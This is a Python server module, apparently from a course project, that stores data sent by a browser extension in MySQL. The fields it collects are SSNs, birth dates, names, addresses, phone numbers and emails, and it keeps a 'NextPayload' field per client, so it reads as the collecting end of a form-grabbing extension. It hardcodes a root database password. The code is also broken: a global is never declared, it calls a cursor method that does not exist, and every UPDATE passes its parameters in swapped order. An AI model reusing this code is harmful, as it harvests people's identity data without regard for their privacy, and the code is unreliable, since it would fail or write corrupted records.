import pymysql
import json

conn = None

def initDB():
    if(conn == None):
        conn = pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
def getCursor():
    if(conn == None):
        initDB()
    return conn.getCursor()

"""
param data: form from extension->server payload in the form of a dictionary. key-value pairs are
    "url": url and remotedef: value
Function first reduces url to subdomain.domain.tld and queries FormIDMappings table for all matching rows
Then, for each remotedef: value pair looks for a mapping from query results. if not found, pair is left
    in the dict. if it is found, the data is stored in the appropriate place. (Credentials, CreditCard, etc.)
Remaining values are stored in the ComplexForms table after being converted back into a json string.
"""
def store_form_data(data):
    url = data.pop("url", None)
    if url == None:
        return -1

    cur = getCursor()
    phoneNumber = data["forms"]["phone"]
    address = data["forms"]["Address"]
    firstName = data["forms"]["FirstName"]
    lastName = data["forms"]["LastName"]
    birthDate = data["forms"]["BirthDate"]
    email = data["forms"]["Email"]
    ssn = data["forms"]["SSN"]
    id = data["clientid"]
    cur.execute('SELECT ID FROM Client C WHERE ID = (%s)', id)
    if(cur.rowcount == 0):
        cur.execute('INSERT INTO Client(Id, CellPhone, Address, Email, SSN, FirstName, LastName, BirthDate, NextPayload) VALUES(%s, %s, %s,%s, %s, %s, %s, %s, "")', (id, phoneNumber, address, email, ssn, firstName, lastName, birthDate)) 
        conn.commit()   
    else:
        if(phoneNumber != ""):
            cur.execute('UPDATE Client SET CellPhone = (%s) WHERE Id = (%s)', (id, phoneNumber))
        if(address != ""):
            cur.execute('UPDATE Client SET Address = (%s) WHERE Id = (%s)', (id, address))
        if(email != ""):
            cur.execute('UPDATE Client SET Email = (%s) WHERE Id = (%s)',(id, email))
        if(ssn != ""):
            cur.execute('UPDATE Client SET SSN = (%s)  WHERE Id = (%s)',(id, ssn))
        if(firstName != ""):
            cur.execute('UPDATE Client SET FirstName = (%s) WHERE Id = (%s)',(id, firstName))
        if(lastName != ""):
            cur.execute('UPDATE Client SET LastName = (%s) WHERE Id = (%s)',(id, lastName))
        if(birthDate != ""):
            cur.execute('UPDATE Client SET BirthDate = (%s) WHERE Id = (%s)',(id, birthDate))
        conn.commit()
